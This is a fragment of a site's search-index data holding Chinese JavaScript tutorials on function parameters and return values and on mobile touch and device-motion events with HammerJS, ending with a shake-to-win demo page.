}\n\nfun(10,20,)\n\n\n功能：重新排列元素项，改变最后一个元素位置时不需要增删逗号\n\n\n# 函数的重载\n\n> 一个函数通过传入的参数的个数不同或者参数类型的不同，可以对应函数的多个实现，而且每一种实现对应一个函数体。\n> 重载函数常用来实现功能类似而所处理的数据类型不同的问题。\n\n模拟函数的重载：\n\nfunction fun(a,b){\n    if(arguments.length == 1){\n            alert("只有一个参数"+a);\n    }\n    if(arguments.length == 2){\n            alert(" 有两个参数"+a+"和"+b);\n    }\n    if(arguments.length >= 3){\n            alert("参数太多了");\n    }\n}\nfun(1,3.4,4);\n\n\n\n# [es6]函数参数默认值\n\n// 该函数计算两数之和，但如果调用只传入一个参数则结果是NaN，所以必须为参数设置默认值0\nfunction add(a,b){\n    return a+b\n}\n\n\n# ES5设置默认值方式\n\n使用短路原则为变量设置默认值\n\n// 利用短路原则为函数参数设置默认值，参数存在则取参数，参数未传则取0\nfunction add(a,b){\n   a = a||0;\n   b = b||0;\n   return a+b\n}\n\n\n// 为变量设置默认值1\nvar num = num || 1\n\n\n\n# ES6函数参数设置默认值\n\nES6允许为函数的参数设置默认值，即直接写在参数定义的后面。\n\nfunction add(x, y = 0) {\nconsole.log(x, y);\n}\nlog(10) // 10 0\nlog(10, 100) // 10  100\nlog(10, \'\') // 10\n\n\n参数默认值可以与解构赋值的默认值，结合起来使用。\n\nfunction foo({x, y = 5}) {\n  console.log(x, y);\n}\n\nfoo({}) // undefined 5\nfoo({x: 1}) // 1 5\nfoo({x: 1, y: 2}) // 1 2\nfoo() // TypeError: Cannot read property \'x\' of undefined\n\n\n\n# 函数的length属性\n\n函数的length属性，将返回没有指定默认值的参数个数，仅包括第一个具有默认值之前的参数个数。\n\nfunction aa(a){}\nfunction bb(a=5){}\nfunction cc(a,b,c=5){}\n\nconsole.log(aa.length) // 1\nconsole.log(bb.length) // 0\nconsole.log(cc.length) // 2\n\n\n\n# name属性\n\n> 函数的name属性，返回该函数的函数名。\n\nfunction foo() {}\nfoo.name // "foo"\n\n\n这个属性早就被浏览器广泛支持，但是直到 ES6，才将其写入了标准。\n\n需要注意的是，ES6 对这个属性的行为做出了一些修改。如果将一个匿名函数赋值给一个变量，ES5 的name属性，会返回空字符串，而 ES6 的name属性会返回实际的函数名。\n\n\n# 函数返回值\n\n> 函数体中的计算结果可以输出查看，但是如果想对函数的结果进行处理则需要用到函数的返回值。\n\n函数体中的关键字 return 可以将函数体中运行的结果返回给函数外部：\n\nfunction fun(a,b){\n    var num = a+b;\n    return num;\n}\nvar end = fun(1,2);    // 函数运行结果保存到变量end中\n\n\n\n# return 的功能\n\n 1. 将函数运行结果返回\n 2. 停止并跳出当前函数 （不会执行return后面的语句）\n\nfunction aa(){\n  return;\n  alert("hello world");\n}\naa();   // 没有弹出 hello world\n\n\n> 一个函数可以有多个return语句，但只有一个return执行（常用于判断）\n\nfunction aa(a){\n    if(a>0){\n        alert(a);\n        return;\n    }\n    if(a<=0){\n        alert(a);\n        return;\n    }\n}\naa(3);  //  3\n\n\n\n# 函数返回值使用事项\n\n 1. 返回值可以是任何数据类型\n 2. 每个函数都默认有返回值，如果一个函数没有写return，会默认返回undefined。\n\n```javascript\nfunction aa(a){\n\tif(a>0){\n\t\talert(a);\n\t\treturn;\n\t}\n\tif(a<=0){\n\t\talert(a);\n\t\treturn 1;\n\t}\n}\nalert(aa(3));   //  3  undefined\nalert(aa(0));   //  0  1\n```\n\n\n 3. 一个函数只能有一个返回值。\n\n```javascript\nfunction bb(a,b,c){\n\treturn a,b,c;\n}\nalert(bb(3,5,7)); //  7\n```\n原因：用逗号做返回值时，是按从左到右赋值的，最终赋值为最后一个值，前面的值被覆盖了。\n> 如果想返回多个值，则可以将多个值打包为数组或对象\n',normalizedContent:'# 函数参数与返回值\n\n\n# 函数的参数\n\n> 可以动态的改变函数的变量的类型与值，使同一函数实现不同的效果\n\n当我们封装一个功能，例如十行十列表格，但是每次使用该功能时想动态改变实现效果，例如想输出为五行五列、两行两列的表格，这时就需要修改函数体代码。 而更好的方法就是，在调用时有使用者传入一些值来控制函数体中的相关功能，即可实现不同效果，这个使用者在调用函数时传入的值就是函数的参数。\n\n\n# 参数作用\n\n可以动态的改变函数的变量的类型与值，使同一函数产生不同的结果。\n\n\n# 参数类型\n\n * 形参：函数在定义时，括号里所定义的变量。 (形式上存在，只有在被调用时才有值)\n * 实参：函数在调用时，括号里所传入的值。 (进行函数调用时,它们都必须具有确定的值, 以便把这些值传送给形参)\n\n// num 是形参\nfunction ta(num){\n\tfor(var i = 1;i <= num;i++){\n\t    for(var j = 1;j <= num-i;j++){\n\t\t    document.write("&nbsp;");\n\t    }\n\t    for(var k = 1;k <= i*2-1;k++){\n\t\t    document.write("*");\n\t    }\n\t    document.write("<br>");\n  }\n}\nta(6);    // 6 是实参\n\n\n在实参为形参传递过程中，实参和形参位于内存中两个不同地址中，实参先自己复制一次拷贝，再把拷贝复制给形参。所以，在函数体中，形参的变化不会对实参有任何的影响。例如：\n\nvar number = 10\nfunction fun(number){\n    number = 100\n}\n\nfun(number);\nalert(number);   // 10\n\n\n\n# 参数详解\n\n 1. 参数可以是任何的数据类型\n\n * 参数个数\n * 参数尾逗号\n\n# 参数数据类型\n\n参数可以是任何的数据类型\n\nfunction typeof(type){\nalert(typeof type);\n}\ntypeof(1)\ntypeof("a")\ntypeof(true)\ntypeof(null)\ntypeof()\n//甚至可以传入函数：\ntypeof(function(){alert(1)})\n\n\n# 参数个数\n\n 1. 实参与形参的个数相同时，一一对应。\n\n 2. 实参小于形参时，形参自动赋值为undefined。\n    \n    function aa(a,b){\n        alert(a);\n        alert(b);\n    }\n    aa(1);  //   1  undefined\n    \n\n 3. 实参大于形参时，使用arguments对象来获取。\n    \n    function aa(a,b){\n        alert(a);\n        alert(b);\n        alert(arguments.length);\n        alert(arguments[2]);\n        alert(arguments.callee);\n    }\n    aa(1,5,7);   //依次弹出 1  5  3   7  函数本身\n    \n\n 4. arguments对象 在创建函数时，隐式的创建了arguments对象，它是用来记录函数的参数的信息的，只能在函数内部使用\n    它的属性：\n    * length: 函数的参数的长度\n    * callee: 对函数本身的调用\n    * 可以通过下标来访问具体参数的值。\n    \n    > 注：arguments对象不是数组，而是一个类似数组的对象。所以为了使用数组的方法，必须使用array.prototype.slice.call先将其转为数组。\n\n 5. [es6]rest参数\n    \n    > es6 引入 rest 参数（形式为...变量名），用于获取函数的多余参数，这样就不需要使用arguments对象了。rest参数搭配的变量是一个数组，该变量将多余的参数放入数组中。\n    \n    function fun(...a){\n        console.log(a);    // [1,2,3,4]\n    }\n    fun(1,2,3,4)\n    \n    function fun(a, ...b){\n        console.log(a,b);    //1   [2,3,4]\n    }\n    fun(1,2,3,4)\n    \n    // rest 参数之后不能再有其他参数（即只能是最后一个参数），否则会报错。\n    function f(a, ...b, c) {\n        // 报错\n    }\n    \n\n\n# 严格模式\n\n> 函数参数使用了默认值、解构赋值、或者扩展运算符，那么函数内部就不能显式设定为严格模式，否则会报错。\n\n// 报错\nfunction dosomething(a, b = a) {\n  \'use strict\';\n  // code\n}\n\n// 报错\nconst dosomething = function ({a, b}) {\n  \'use strict\';\n  // code\n};\n\n// 报错\nconst dosomething = (...a) => {\n  \'use strict\';\n  // code\n};\n\nconst obj = {\n  // 报错\n  dosomething({a, b}) {\n    \'use strict\';\n    // code\n  }\n};\n\n\n\n# 参数尾逗号\n\n在es7种，函数实参和形参末尾可以以逗号结束：\n\nfunction fun(a,b,){ }\n\nfun(10,20,)\n\n\n功能：重新排列元素项，改变最后一个元素位置时不需要增删逗号\n\n\n# 函数的重载\n\n> 一个函数通过传入的参数的个数不同或者参数类型的不同，可以对应函数的多个实现，而且每一种实现对应一个函数体。\n> 重载函数常用来实现功能类似而所处理的数据类型不同的问题。\n\n模拟函数的重载：\n\nfunction fun(a,b){\n    if(arguments.length == 1){\n            alert("只有一个参数"+a);\n    }\n    if(arguments.length == 2){\n            alert(" 有两个参数"+a+"和"+b);\n    }\n    if(arguments.length >= 3){\n            alert("参数太多了");\n    }\n}\nfun(1,3.4,4);\n\n\n\n# [es6]函数参数默认值\n\n// 该函数计算两数之和，但如果调用只传入一个参数则结果是nan，所以必须为参数设置默认值0\nfunction add(a,b){\n    return a+b\n}\n\n\n# es5设置默认值方式\n\n使用短路原则为变量设置默认值\n\n// 利用短路原则为函数参数设置默认值，参数存在则取参数，参数未传则取0\nfunction add(a,b){\n   a = a||0;\n   b = b||0;\n   return a+b\n}\n\n\n// 为变量设置默认值1\nvar num = num || 1\n\n\n\n# es6函数参数设置默认值\n\nes6允许为函数的参数设置默认值，即直接写在参数定义的后面。\n\nfunction add(x, y = 0) {\nconsole.log(x, y);\n}\nlog(10) // 10 0\nlog(10, 100) // 10  100\nlog(10, \'\') // 10\n\n\n参数默认值可以与解构赋值的默认值，结合起来使用。\n\nfunction foo({x, y = 5}) {\n  console.log(x, y);\n}\n\nfoo({}) // undefined 5\nfoo({x: 1}) // 1 5\nfoo({x: 1, y: 2}) // 1 2\nfoo() // typeerror: cannot read property \'x\' of undefined\n\n\n\n# 函数的length属性\n\n函数的length属性，将返回没有指定默认值的参数个数，仅包括第一个具有默认值之前的参数个数。\n\nfunction aa(a){}\nfunction bb(a=5){}\nfunction cc(a,b,c=5){}\n\nconsole.log(aa.length) // 1\nconsole.log(bb.length) // 0\nconsole.log(cc.length) // 2\n\n\n\n# name属性\n\n> 函数的name属性，返回该函数的函数名。\n\nfunction foo() {}\nfoo.name // "foo"\n\n\n这个属性早就被浏览器广泛支持，但是直到 es6，才将其写入了标准。\n\n需要注意的是，es6 对这个属性的行为做出了一些修改。如果将一个匿名函数赋值给一个变量，es5 的name属性，会返回空字符串，而 es6 的name属性会返回实际的函数名。\n\n\n# 函数返回值\n\n> 函数体中的计算结果可以输出查看，但是如果想对函数的结果进行处理则需要用到函数的返回值。\n\n函数体中的关键字 return 可以将函数体中运行的结果返回给函数外部：\n\nfunction fun(a,b){\n    var num = a+b;\n    return num;\n}\nvar end = fun(1,2);    // 函数运行结果保存到变量end中\n\n\n\n# return 的功能\n\n 1. 将函数运行结果返回\n 2. 停止并跳出当前函数 （不会执行return后面的语句）\n\nfunction aa(){\n  return;\n  alert("hello world");\n}\naa();   // 没有弹出 hello world\n\n\n> 一个函数可以有多个return语句，但只有一个return执行（常用于判断）\n\nfunction aa(a){\n    if(a>0){\n        alert(a);\n        return;\n    }\n    if(a<=0){\n        alert(a);\n        return;\n    }\n}\naa(3);  //  3\n\n\n\n# 函数返回值使用事项\n\n 1. 返回值可以是任何数据类型\n 2. 每个函数都默认有返回值，如果一个函数没有写return，会默认返回undefined。\n\n```javascript\nfunction aa(a){\n\tif(a>0){\n\t\talert(a);\n\t\treturn;\n\t}\n\tif(a<=0){\n\t\talert(a);\n\t\treturn 1;\n\t}\n}\nalert(aa(3));   //  3  undefined\nalert(aa(0));   //  0  1\n```\n\n\n 3. 一个函数只能有一个返回值。\n\n```javascript\nfunction bb(a,b,c){\n\treturn a,b,c;\n}\nalert(bb(3,5,7)); //  7\n```\n原因：用逗号做返回值时，是按从左到右赋值的，最终赋值为最后一个值，前面的值被覆盖了。\n> 如果想返回多个值，则可以将多个值打包为数组或对象\n',charsets:{cjk:!0}},{title:"移动端事件",frontmatter:{},regularPath:"/Javascript/JavaScriptDOM%E6%93%8D%E4%BD%9C/%E7%A7%BB%E5%8A%A8%E7%AB%AF%E4%BA%8B%E4%BB%B6.html",relativePath:"Javascript/JavaScriptDOM操作/移动端事件.md",key:"v-02135610",path:"/Javascript/JavaScriptDOM%E6%93%8D%E4%BD%9C/%E7%A7%BB%E5%8A%A8%E7%AB%AF%E4%BA%8B%E4%BB%B6.html",headers:[{level:2,title:"移动端常用事件",slug:"移动端常用事件",normalizedTitle:"移动端常用事件",charIndex:238},{level:3,title:"touch事件模型（手势事件）",slug:"touch事件模型-手势事件",normalizedTitle:"touch事件模型（手势事件）",charIndex:455},{level:3,title:"DeviceMotionEvent事件",slug:"devicemotionevent事件",normalizedTitle:"devicemotionevent事件",charIndex:1370},{level:2,title:"手势库",slug:"手势库",normalizedTitle:"手势库",charIndex:2365},{level:3,title:"HammerJS",slug:"hammerjs",normalizedTitle:"hammerjs",charIndex:2373},{level:2,title:"案例",slug:"案例",normalizedTitle:"案例",charIndex:5760},{level:3,title:"摇一摇",slug:"摇一摇",normalizedTitle:"摇一摇",charIndex:1832}],headersStr:"移动端常用事件 touch事件模型（手势事件） DeviceMotionEvent事件 手势库 HammerJS 案例 摇一摇",content:'# 移动端事件\n\n> 在1996年，Netscape（网景）引入了鼠标事件和著名的鼠标悬停事件，使得Web开发者能够在PC端开发出可交互的网站。随后引入了键盘事件，能够让我们在网页中监控到用户的输入动作。这两种事件在PC端统治了长达15年，一直到iOS设备的出现，它既没有鼠标也没有键盘，所以在为移动Safari开发交互网页时，常规的鼠标和键盘事件根本不够用，于是又了第三种时间-触摸事件。随着Android中的WebKit的加入，很多这样的专有事件变成了事实标准。\n\n\n# 移动端常用事件\n\n事件       描述\nclick    当点击时触发（单击）\nload     页面结束加载之后触发\nscroll   当元素滚动条被滚动时运行的脚本\nblur     元素失去焦点时运行的脚本\nfocus    当元素获得焦点时运行的脚本\nchange   在元素值被改变时运行的脚本\ninput    代替keyup、keydown\ntouch    处理单手指操作\n\x3c!--     gesture\n\n\n# touch事件模型（手势事件）\n\n事件            描述\ntouchstart    当手指触摸屏幕时候触发，即使已经有一个手指放在屏幕上也会触发。\ntouchmove     当手指在屏幕上滑动的时候连续地触发。在这个事件发生期间，调用preventDefault()事件可以阻止滚动\ntouchend      当手指从屏幕上离开的时候触发\ntouchcancle   特殊情况下关闭/退出时触发\n\n触摸事件的事件对象\n\n> 我们可以同时又很多手指触摸屏幕，所以在事件对象里面给我们提供了相应的数组来存储每个手指的信息。\n\n * touches：表示当前跟踪的触摸操作的touch对象的数组。\n * targetTouches：特定于事件目标的Touch对象的数组。\n * changeTouches：表示自上次触摸以来发生了什么改变的Touch对象的数组。\n\n事件对象属性\n\n属性           描述\nclientX      触摸目标在视口中的x坐标\nclientY      触摸目标在视口中的y坐标\nidentifier   标识触摸的唯一ID\npageX        触摸目标在页面中的x坐标\npageY        触摸目标在页面中的y坐标\nscreenX      触摸目标在屏幕中的x坐标\nscreenY      触摸目标在屏幕中的y坐标\ntimeStamp    从页面打开到当前时间触发所经过的毫秒数\n\nclientX:65 // 触摸点在浏览器窗口中的横坐标\nclientY:18 // 触摸点在浏览器窗口中的纵坐标\nforce:1 // 触摸点压力大小\nidentifier:0 // 触摸点唯一标识（ID）\npageX:65 // 触摸点在页面中的横坐标\npageY:18 // 触摸点在页面中的纵坐标\nradiusX:11.5 // 触摸点椭圆的水平半径\nradiusY:11.5 // 触摸点椭圆的垂直半径\nrotationAngle:0 // 旋转角度\nscreenX:560 // 触摸点在屏幕中的横坐标\nscreenY:175 // 触摸点在屏幕中的纵坐标\n\n\n\n# DeviceMotionEvent事件\n\nDeviceMotionEvent为web开发者提供了关于设备的位置和方向改变的速度的信息。\n目前，Firefox 和 Chrome 处理坐标的方式不同。 在使用它们的时候要多加注意。\n\n# 原理\n\n开发者从各个内置传感器那里获取未经修改的传感数据，并观测或响应设备各种运动和角度变化。这些传感器包括陀螺仪、加速器和磁力仪(罗盘)。\n\n加速器和陀螺仪的数据都是描述沿着iOS设备三个方向轴上的位置，对于一个竖屏摆放的iPhone来说，X方向从设备的左边(负)到右边(正)，Y方向则是由设备的底部(-)到顶部(+)，而Z方向为垂直于屏幕由设备的背面(-)到正面(+)。\n\nDeviceMotionEvent 会在设备发生有意义的摆动(或运动)时产生.事件对象封装有产生的间距值,旋转率,和设备加速度.\n\n加速度的计算方式是重力和用户产生的两个加速度矢量之和.设备是通过 陀螺仪和加速计来区别这两者的.\n\n通过DeviceMotion对设备运动状态的判断，则可以帮助我们在网页上就实现“摇一摇”的交互效果。\n\n# 属性(只读)\n\n属性                                               描述\nDeviceMotionEvent.acceleration                   提供了设备在X,Y,Z轴方向上加速度的对象。加速度的单位为 m/s2。\nDeviceMotionEvent.accelerationIncludingGravity   提供了设备在X,Y,Z轴方向上带重力的加速度的对象。加速度的单位为 m/s2\nDeviceMotionEvent.rotationRate                   提供了设备在 alpha，beta， gamma轴方向上旋转的速率的对象。旋转速率的单位为 ?°/s 。\nDeviceMotionEvent.interval                       表示从设备获取数据的频率，单位是毫秒。\n\nwindow.addEventListener(\'devicemotion\', function(event) {\n  console.log(event.acceleration.x + \' m/s2\');\n});\n\n\n\n# 手势库\n\n\n# HammerJS\n\n# 简介\n\n用于检测触摸手势的 JavaScript 库\n添加对触摸手势的支持并移除了点击的 300ms\n支持最常见的单点和多点触摸手势，并且可以完全扩展以添加自定义手势\n\n> 安卓触屏上，tap 和 click 可以同时触发，但是 click 会有 300ms 左右的延时\n\n# 兼容性\n\n查看兼容：http://hammerjs.github.io/browser-support/\n\n# 下载安装\n\n点击下载：http://hammerjs.github.io/dist/hammer.min.js\n\n# 基本使用\n\n<div id="test" class="test"></div>\n<script type="text/javascript">\n       //创建一个新的hammer对象并且在初始化时指定要处理的dom元素\n       var hammertime = new Hammer(document.getElementById("test"));\n       //为该dom元素指定触屏移动事件\n       hammertime.on("pan", function (ev) {\n           //控制台输出\n           console.log(ev);\n       });\n<\/script>\n\n\nhammer.js 提供了 tap, doubletap, press, horizontal pan, swipe 和多点触控的 pinch, rotate，默认情况下 pinch 与 rotate 是禁用的，因为它们会阻塞元素，可以通过以下命令来启用。\n\nhammertime.get(\'pinch\').set({ enable: true });\nhammertime.get(\'rotate\').set({ enable: true });\n\n\n默认的 pan 仅支持水平方向，可以选择启用全部方向，swipe 也可以启用垂直方向\n\nhammertime.get(\'pan\').set({ direction: Hammer.DIRECTION_ALL });\nhammertime.get(\'swipe\').set({ direction: Hammer.DIRECTION_VERTICAL });\n\n\n建议使用 viewport meta 禁用双击/缩放功能，更多的控制网页，支持触摸操作的浏览器不需要这样做\n\n<meta name="viewport" content="user-scalable=no, width=device-width, initial-scale=1, maximum-scale=1">\n\n\n# 手势总结\n\n\n\n 1. tap\n    在指定的 DOM 区域内，一个手指轻拍或点击时触发该事件（类似 PC 端的 click），该事件最大点击时间为 250ms，如果超过 250ms 则按 press 事件处理\n 2. press 在指定的 DOM 区域内，这个事件相当于 PC 端的 Click 事件，不能包含任何的移动，最小按压时间为 500ms，常用于我们在手机上用的复制粘贴等功能\n    该事件事分别对以下事件进行监听并处理\n    * pressup: 点击事件离开时触发\n 3. pan 在指定的 DOM 区域内，一个手指放下并移动事件，即触屏中的拖动事件\n    该事件事分别对以下事件进行监听并处理\n    * panstart: 拖动开始\n    * panmove: 拖动过程\n    * panend: 拖动结束\n    * pancancel: 拖动取消\n    * panleft: 向左拖动\n    * panup: 向上拖动\n    * pandown: 向下拖动\n 4. swipe 在指定的 DOM 区域内，一个手指快速的在触屏上滑动，即平时用到最多的滑动事件\n    该事件事分别对以下事件进行监听并处理\n    * swipeleft: 向左滑动\n    * swiperight: 向右滑动\n    * swipeup: 向上滑动\n    * swipedown: 向下滑动\n 5. pinch 在指定的 DOM 区域内，两个手指（默认为两个手指，多指触控需要单独设置）或多个手指相对（越来越近）移动或相向（越来越远）移动时事件\n    该事件事分别对以下事件进行监听并处理\n    * pinchstart: 多点触控开始\n    * pinchmove: 多点触控过程\n    * pinchend: 多点触控结束\n    * pinchcancel: 多点触控取消\n    * pinchin: 多点触控时两手指越来越近\n    * pinchout: 多点触控时两手指越来越远\n 6. rotate 在指定的 DOM 区域内，当两个手指或更多手指呈圆型旋转时触发\n    该事件事分别对以下事件进行监听并处理\n    * rotatestart: 旋转开始\n    * rotatemove: 旋转过程\n    * rotateend: 旋转结束\n    * rotatecancel: 旋转取消\n\n# 事件对象\n\nNAME              VALUE\ntype              事件的名称，例如 panstart\ndeltaX            X 轴移动\ndeltaY            Y 轴移动\ndeltaTime         自从第一次 input 的总时间，单位 ms\ndistance          移动距离\nangle             角度\nvelocityX         X 轴上的速度，单位为 px/ms\nvelocityY         Y 轴上的速度，单位为 px/ms\nvelocity          velocityX/velocityY 的最高值\ndirection         移动方向，匹配 DIRECTION 常量\noffsetDirection   相对于起点的方向，匹配 DIRECTION 常量\nscale             在多点触摸缩放时，只是触摸时值为 1\nrotation          在多点触摸旋转时，只是触摸时值为 0\ncenter            多点触摸的中心位置，或者只是单独的点\nsrcEvent          源事件对象，类型为 TouchEvent，MouseEvent 或 PointerEvent\ntarget            收到该事件的目标\npointerType       主要点类型，可能是 touch，mouse，pen 或 kinect\neventType         事件类型，匹配 INPUT 常量\nisFirst           第一个 input 时为 true\nisFinal           最后一个 input 时为 true\npointers          所有点的数组，包括结束点（touchend，mouseup）\nchangedPointers   包含所有 new/moved/lost 的点\npreventDefault    参考 srcEvent.preventDefault() 方法\n\n# 使用注意事项\n\n 1. 尽量避免垂直 pan/swipe\n    垂直 pan 用于滚动页面，一些（旧）浏览器不会触发这个事件，所以 hammer.js 无法识别\n 2. 删除 Windows Phone 上的突出显示\n    Windows Phone 上的 IE10 和 IE11 在点击某个元素时会突出显示一个小点，添加这个 meta 来删除\n    <meta name="msapplication-tap-highlight" content="no" />\n 3. tap 后，click 也被触发了\n    该点击事件也被称为 “幽灵点击”（ghost click）\n\n\n# 案例\n\n\n# 摇一摇\n\n<!DOCTYPE html>\n<html>\n <head>\n     <meta charset="UTF-8">\n     <meta name="viewport" content="width=device-width,initial-scale=1.0,maximum-scale=1.0,minimum-scale=1.0,user-scalable=no">\n     <title>摇一摇抽奖</title>\n    <style type="text/css">\n        html,body{ width:100%; height:100%; background-color: #000; margin:0; overflow: hidden;}\n       .tip{ position: absolute; bottom: 30px; left: 10px; color: #fff; font-family: \'楷体\'; text-align: center; right: 10px; height: 32px; line-height: 32px; background-color: rgba(255,255,255,.4); border-radius: 3px; } .tip.active{ -webkit-animation: jump 1.5s linear; animation: jump 1s linear; }\n   </style>\n</head>\n<body>\n    <div class="tip" id="tip"> </div>\n\n    <script type="text/javascript">\n        var lastX = null,\n            lastY = null,\n            lastZ = null;\n        var threshold = 3; //灵敏度（值越小灵敏度越高）\n        var timeout = 1000;\n        var lastTime = null;\n        var isShaking = !1;\n        document.addEventListener(\'DOMContentLoaded\', function (e) {\n            ready();\n        }, !1);\n        /*脚本逻辑：\n        *移动端JS脚本逻辑的实现，摇一摇的实现需借助html5新增的devicemotion事件，获取设备在位置和方向上的改变速度的相关信息。\n        *devicemotion事件对象中有一个accelerationIncludingGravity属性，该属性包括：一个包含x、y 和z 属性的对象，在考虑z 轴自然重力加速度的情况下，告诉你在每个方向上的加速度。\n        */\n        function ready() {\n            if (window.DeviceMotionEvent) {\n                window.addEventListener(\'devicemotion\', handler, !1);\n                lastTime = new Date();\n            } else {\n                alert(\'你的浏览器不支持摇一摇功能.\');\n            }\n        }\n        function handler(e) {\n            var current = e.accelerationIncludingGravity;\n            var currentTime;\n            var timeDifference;\n            var deltaX = 0;\n            var deltaY = 0;\n            var deltaZ = 0;\n\n            //记录上一次设备在x,y,z方向上的加速度\n            if ((lastX === null) && (lastY === null) && (lastZ === null)) {\n                lastX = current.x;\n                lastY = current.y;\n                lastZ = current.z;\n                return;\n            }\n\n            //得到两次移动各个方向上的加速度绝对差距\n            deltaX = Math.abs(lastX - current.x);\n            deltaY = Math.abs(lastY - current.y);\n            deltaZ = Math.abs(lastZ - current.z);\n            //当差距大于设定的阀值并且时间间隔大于指定阀值时，触发摇一摇逻辑\n            if (((deltaX > threshold) && (deltaY > threshold)) || ((deltaX > threshold) && (deltaZ > threshold)) || ((deltaY > threshold) && (deltaZ > threshold))) {\n                currentTime = new Date;\n                timeDifference = currentTime.getTime() - lastTime.getTime();\n                //时间间隔\n                if (timeDifference > timeout) {\n                    //触发摇一摇事件\n                    dealShake();\n                    lastTime = new Date;\n                }\n            }\n\n            lastX = current.x;\n            lastY = current.y;\n            lastZ = current.z;\n        }\n\n        function dealShake() {\n            if (isShaking) return;\n             isShaking = !0;\n\n            document.getElementById("tip").innerHTML = "恭喜您，摇中：" + GetName();\n\n            setTimeout(function () {\n                isShaking = !1;\n                document.getElementById("tip").innerHTML = " ";\n            }, 1000);\n\n        }\n        function GetName() {\n            var chars = ["一等奖", "二等奖", "三等奖", "四等奖", "五等奖"];\n            return chars[GetRandom(0, chars.length - 1)];\n        }\n        function GetRandom(minValue, maxValue) {\n            return Math.round(Math.random() * (maxValue - minValue)) + minValue;\n        }\n    <\/script>\n</body>\n</html>\n',normalizedContent:'# 移动端事件\n\n> 在1996年，netscape（网景）引入了鼠标事件和著名的鼠标悬停事件，使得web开发者能够在pc端开发出可交互的网站。随后引入了键盘事件，能够让我们在网页中监控到用户的输入动作。这两种事件在pc端统治了长达15年，一直到ios设备的出现，它既没有鼠标也没有键盘，所以在为移动safari开发交互网页时，常规的鼠标和键盘事件根本不够用，于是又了第三种时间-触摸事件。随着android中的webkit的加入，很多这样的专有事件变成了事实标准。\n\n\n# 移动端常用事件\n\n事件       描述\nclick    当点击时触发（单击）\nload     页面结束加载之后触发\nscroll   当元素滚动条被滚动时运行的脚本\nblur     元素失去焦点时运行的脚本\nfocus    当元素获得焦点时运行的脚本\nchange   在元素值被改变时运行的脚本\ninput    代替keyup、keydown\ntouch    处理单手指操作\n\x3c!--     gesture\n\n\n# touch事件模型（手势事件）\n\n事件            描述\ntouchstart    当手指触摸屏幕时候触发，即使已经有一个手指放在屏幕上也会触发。\ntouchmove     当手指在屏幕上滑动的时候连续地触发。在这个事件发生期间，调用preventdefault()事件可以阻止滚动\ntouchend      当手指从屏幕上离开的时候触发\ntouchcancle   特殊情况下关闭/退出时触发\n\n触摸事件的事件对象\n\n> 我们可以同时又很多手指触摸屏幕，所以在事件对象里面给我们提供了相应的数组来存储每个手指的信息。\n\n * touches：表示当前跟踪的触摸操作的touch对象的数组。\n * targettouches：特定于事件目标的touch对象的数组。\n * changetouches：表示自上次触摸以来发生了什么改变的touch对象的数组。\n\n事件对象属性\n\n属性           描述\nclientx      触摸目标在视口中的x坐标\nclienty      触摸目标在视口中的y坐标\nidentifier   标识触摸的唯一id\npagex        触摸目标在页面中的x坐标\npagey        触摸目标在页面中的y坐标\nscreenx      触摸目标在屏幕中的x坐标\nscreeny      触摸目标在屏幕中的y坐标\ntimestamp    从页面打开到当前时间触发所经过的毫秒数\n\nclientx:65 // 触摸点在浏览器窗口中的横坐标\nclienty:18 // 触摸点在浏览器窗口中的纵坐标\nforce:1 // 触摸点压力大小\nidentifier:0 // 触摸点唯一标识（id）\npagex:65 // 触摸点在页面中的横坐标\npagey:18 // 触摸点在页面中的纵坐标\nradiusx:11.5 // 触摸点椭圆的水平半径\nradiusy:11.5 // 触摸点椭圆的垂直半径\nrotationangle:0 // 旋转角度\nscreenx:560 // 触摸点在屏幕中的横坐标\nscreeny:175 // 触摸点在屏幕中的纵坐标\n\n\n\n# devicemotionevent事件\n\ndevicemotionevent为web开发者提供了关于设备的位置和方向改变的速度的信息。\n目前，firefox 和 chrome 处理坐标的方式不同。 在使用它们的时候要多加注意。\n\n# 原理\n\n开发者从各个内置传感器那里获取未经修改的传感数据，并观测或响应设备各种运动和角度变化。这些传感器包括陀螺仪、加速器和磁力仪(罗盘)。\n\n加速器和陀螺仪的数据都是描述沿着ios设备三个方向轴上的位置，对于一个竖屏摆放的iphone来说，x方向从设备的左边(负)到右边(正)，y方向则是由设备的底部(-)到顶部(+)，而z方向为垂直于屏幕由设备的背面(-)到正面(+)。\n\ndevicemotionevent 会在设备发生有意义的摆动(或运动)时产生.事件对象封装有产生的间距值,旋转率,和设备加速度.\n\n加速度的计算方式是重力和用户产生的两个加速度矢量之和.设备是通过 陀螺仪和加速计来区别这两者的.\n\n通过devicemotion对设备运动状态的判断，则可以帮助我们在网页上就实现“摇一摇”的交互效果。\n\n# 属性(只读)\n\n属性                                               描述\ndevicemotionevent.acceleration                   提供了设备在x,y,z轴方向上加速度的对象。加速度的单位为 m/s2。\ndevicemotionevent.accelerationincludinggravity   提供了设备在x,y,z轴方向上带重力的加速度的对象。加速度的单位为 m/s2\ndevicemotionevent.rotationrate                   提供了设备在 alpha，beta， gamma轴方向上旋转的速率的对象。旋转速率的单位为 ?°/s 。\ndevicemotionevent.interval                       表示从设备获取数据的频率，单位是毫秒。\n\nwindow.addeventlistener(\'devicemotion\', function(event) {\n  console.log(event.acceleration.x + \' m/s2\');\n});\n\n\n\n# 手势库\n\n\n# hammerjs\n\n# 简介\n\n用于检测触摸手势的 javascript 库\n添加对触摸手势的支持并移除了点击的 300ms\n支持最常见的单点和多点触摸手势，并且可以完全扩展以添加自定义手势\n\n> 安卓触屏上，tap 和 click 可以同时触发，但是 click 会有 300ms 左右的延时\n\n# 兼容性\n\n查看兼容：http://hammerjs.github.io/browser-support/\n\n# 下载安装\n\n点击下载：http://hammerjs.github.io/dist/hammer.min.js\n\n# 基本使用\n\n<div id="test" class="test"></div>\n<script type="text/javascript">\n       //创建一个新的hammer对象并且在初始化时指定要处理的dom元素\n       var hammertime = new hammer(document.getelementbyid("test"));\n       //为该dom元素指定触屏移动事件\n       hammertime.on("pan", function (ev) {\n           //控制台输出\n           console.log(ev);\n       });\n<\/script>\n\n\nhammer.js 提供了 tap, doubletap, press, horizontal pan, swipe 和多点触控的 pinch, rotate，默认情况下 pinch 与 rotate 是禁用的，因为它们会阻塞元素，可以通过以下命令来启用。\n\nhammertime.get(\'pinch\').set({ enable: true });\nhammertime.get(\'rotate\').set({ enable: true });\n\n\n默认的 pan 仅支持水平方向，可以选择启用全部方向，swipe 也可以启用垂直方向\n\nhammertime.get(\'pan\').set({ direction: hammer.direction_all });\nhammertime.get(\'swipe\').set({ direction: hammer.direction_vertical });\n\n\n建议使用 viewport meta 